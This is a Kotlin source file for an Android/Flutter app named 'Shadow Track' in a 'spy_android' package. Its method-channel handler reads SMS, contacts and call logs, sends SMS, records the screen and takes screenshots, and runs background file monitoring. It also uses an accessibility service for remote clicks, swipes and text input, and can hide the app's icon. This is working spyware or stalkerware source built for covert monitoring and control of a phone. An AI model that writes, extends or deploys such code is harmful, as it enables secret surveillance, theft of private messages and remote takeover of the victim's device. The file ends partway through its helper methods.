package com.example.spy_android

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ApplicationInfo
import android.database.Cursor
import android.net.Uri
import android.os.BatteryManager
import android.provider.ContactsContract
import android.provider.CallLog
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import androidx.annotation.RequiresApi
import java.text.SimpleDateFormat
import java.util.*
import com.example.spy_android.services.SpyAccessibilityService
import com.example.spy_android.services.ScreenRecordingService
import com.example.spy_android.services.FileMonitoringService
import com.example.spy_android.activities.ScreenCaptureActivity
import android.provider.Settings
import android.media.projection.MediaProjectionManager

class MainActivity: FlutterActivity() {
    private val CHANNEL = "shadow_track"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "initialize" -> {
                    initializeNativeServices()
                    result.success("Initialized")
                }
                "getBatteryLevel" -> {
                    val batteryLevel = getBatteryLevel()
                    result.success(batteryLevel)
                }
                "getNetworkType" -> {
                    val networkType = getNetworkType()
                    result.success(networkType)
                }
                "getInstalledApps" -> {
                    val apps = getInstalledApps()
                    result.success(apps)
                }
                "readSMS" -> {
                    val smsMessages = readSMS()
                    result.success(smsMessages)
                }
                "getContacts" -> {
                    val contacts = getContacts()
                    result.success(contacts)
                }
                "getCallLog" -> {
                    val callLog = getCallLog()
                    result.success(callLog)
                }
                "getDeviceInfo" -> {
                    val deviceInfo = getDeviceInfo()
                    result.success(deviceInfo)
                }
                "sendSMS" -> {
                    val phoneNumber = call.argument<String>("phoneNumber")
                    val message = call.argument<String>("message")
                    if (phoneNumber != null && message != null) {
                        val success = sendSMS(phoneNumber, message)
                        result.success(success)
                    } else {
                        result.error("INVALID_ARGUMENT", "Phone number and message required", null)
                    }
                }
                // 새로운 Chapter 3 기능들
                "startScreenRecording" -> {
                    startScreenRecording()
                    result.success(true)
                }
                "stopScreenRecording" -> {
                    stopScreenRecording()
                    result.success(true)
                }
                "isScreenRecording" -> {
                    result.success(ScreenRecordingService.isRecording)
                }
                "takeScreenshot" -> {
                    val success = takeScreenshot()
                    result.success(success)
                }
                "getScreenshotCount" -> {
                    val count = getScreenshotCount()
                    result.success(count)
                }
                "startFileMonitoring" -> {
                    startFileMonitoring()
                    result.success(true)
                }
                "stopFileMonitoring" -> {
                    stopFileMonitoring()
                    result.success(true)
                }
                "isFileMonitoring" -> {
                    result.success(FileMonitoringService.isMonitoring)
                }
                "getFileMonitoringStatus" -> {
                    val status = getFileMonitoringStatus()
                    result.success(status)
                }
                "forceFileScan" -> {
                    forceFileScan()
                    result.success(true)
                }
                "isAccessibilityServiceEnabled" -> {
                    result.success(SpyAccessibilityService.isServiceRunning)
                }
                "openAccessibilitySettings" -> {
                    openAccessibilitySettings()
                    result.success(true)
                }
                "performRemoteClick" -> {
                    val x = call.argument<Double>("x")?.toFloat()
                    val y = call.argument<Double>("y")?.toFloat()
                    if (x != null && y != null) {
                        val success = performRemoteClick(x, y)
                        result.success(success)
                    } else {
                        result.error("INVALID_ARGUMENT", "X and Y coordinates required", null)
                    }
                }
                "performRemoteSwipe" -> {
                    val startX = call.argument<Double>("startX")?.toFloat()
                    val startY = call.argument<Double>("startY")?.toFloat()
                    val endX = call.argument<Double>("endX")?.toFloat()
                    val endY = call.argument<Double>("endY")?.toFloat()
                    val duration = call.argument<Int>("duration")?.toLong() ?: 500L

                    if (startX != null && startY != null && endX != null && endY != null) {
                        val success = performRemoteSwipe(startX, startY, endX, endY, duration)
                        result.success(success)
                    } else {
                        result.error("INVALID_ARGUMENT", "Start and end coordinates required", null)
                    }
                }
                "performRemoteTextInput" -> {
                    val text = call.argument<String>("text")
                    if (text != null) {
                        val success = performRemoteTextInput(text)
                        result.success(success)
                    } else {
                        result.error("INVALID_ARGUMENT", "Text is required", null)
                    }
                }
                "performBackAction" -> {
                    val success = performBackAction()
                    result.success(success)
                }
                "performHomeAction" -> {
                    val success = performHomeAction()
                    result.success(success)
                }
                "performRecentAppsAction" -> {
                    val success = performRecentAppsAction()
                    result.success(success)
                }
                "openApp" -> {
                    val packageName = call.argument<String>("packageName")
                    if (packageName != null) {
                        val success = openApp(packageName)
                        result.success(success)
                    } else {
                        result.error("INVALID_ARGUMENT", "Package name is required", null)
                    }
                }
                "hideAppIcon" -> {
                    hideAppIcon()
                    result.success(true)
                }
                "showAppIcon" -> {
                    showAppIcon()
                    result.success(true)
                }
                "isAppIconHidden" -> {
                    result.success(isAppIconHidden())
                }
                else -> {
                    result.notImplemented()
                }
            }
        }
    }

    private fun initializeNativeServices() {
        // 네이티브 서비스 초기화
        println("Shadow Track Native Services Initialized - Chapter 3")

        // 백그라운드 서비스들 자동 시작
        try {
            startFileMonitoring()
        } catch (e: Exception) {
            println("파일 모니터링 자동 시작 실패: ${e.message}")
        }
    }

    // 화면 녹화 기능들
    private fun startScreenRecording() {
        try {
            ScreenCaptureActivity.startScreenCapture(this)
        } catch (e: Exception) {
            println("화면 녹화 시작 오류: ${e.message}")
        }
    }

    private fun stopScreenRecording() {
        try {
            val serviceIntent = Intent(this, ScreenRecordingService::class.java)
            stopService(serviceIntent)
        } catch (e: Exception) {
            println("화면 녹화 중지 오류: ${e.message}")
        }
    }

    private fun takeScreenshot(): Boolean {
        return try {
            ScreenRecordingService.instance?.takeScreenshot() ?: false
        } catch (e: Exception) {
            println("스크린샷 촬영 오류: ${e.message}")
            false
        }
    }

    private fun getScreenshotCount(): Int {
        return try {
            ScreenRecordingService.instance?.getScreenshotCount() ?: 0
        } catch (e: Exception) {
            println("스크린샷 개수 조회 오류: ${e.message}")
            0
        }
    }

    // 파일 모니터링 기능들
    private fun startFileMonitoring() {
        try {
            val serviceIntent = Intent(this, FileMonitoringService::class.java)
            startForegroundService(serviceIntent)
        } catch (e: Exception) {
            println("파일 모니터링 시작 오류: ${e.message}")
        }
    }

    private fun stopFileMonitoring() {
        try {
            val serviceIntent = Intent(this, FileMonitoringService::class.java)
            stopService(serviceIntent)
        } catch (e: Exception) {
            println("파일 모니터링 중지 오류: ${e.message}")
        }
    }

    private fun getFileMonitoringStatus(): Map<String, Any> {
        return try {
            FileMonitoringService.instance?.getMonitoringStatus() ?: mapOf(
                "is_monitoring" to false,
                "error" to "Service not running"
            )
        } catch (e: Exception) {
            mapOf(
                "is_monitoring" to false,
                "error" to e.message
            )
        }
    }

    private fun forceFileScan() {
        try {
            FileMonitoringService.instance?.forceFileScan()
        } catch (e: Exception) {
            println("강제 파일 스캔 오류: ${e.message}")
        }
    }

    // Accessibility 서비스 관련
    private fun openAccessibilitySettings() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
        } catch (e: Exception) {
            println("접근성 설정 열기 오류: ${e.message}")
        }
    }

    // 원격 조작 기능들
    private fun performRemoteClick(x: Float, y: Float): Boolean {
        return try {
            SpyAccessibilityService.instance?.performRemoteClick(x, y) ?: false
        } catch (e: Exception) {
            println("원격 클릭 오류: ${e.message}")
            false
        }
    }

    private fun performRemoteSwipe(startX: Float, startY: Float, endX: Float, endY: Float, duration: Long): Boolean {
        return try {
            SpyAccessibilityService.instance?.performRemoteSwipe(startX, startY, endX, endY, duration) ?: false
        } catch (e: Exception) {
            println("원격 스와이프 오류: ${e.message}")
            false
        }
    }

    private fun performRemoteTextInput(text: String): Boolean {
        return try {
            SpyAccessibilityService.instance?.performRemoteTextInput(text) ?: false
        } catch (e: Exception) {
            println("원격 텍스트 입력 오류: ${e.message}")
            false
        }
    }

    private fun performBackAction(): Boolean {
        return try {
            SpyAccessibilityService.instance?.performBackAction() ?: false
        } catch (e: Exception) {
            println("원격 뒤로가기 오류: ${e.message}")
            false
        }
    }

    private fun performHomeAction(): Boolean {
        return try {
            SpyAccessibilityService.instance?.performHomeAction() ?: false
        } catch (e: Exception) {
            println("원격 홈 버튼 오류: ${e.message}")
            false
        }
    }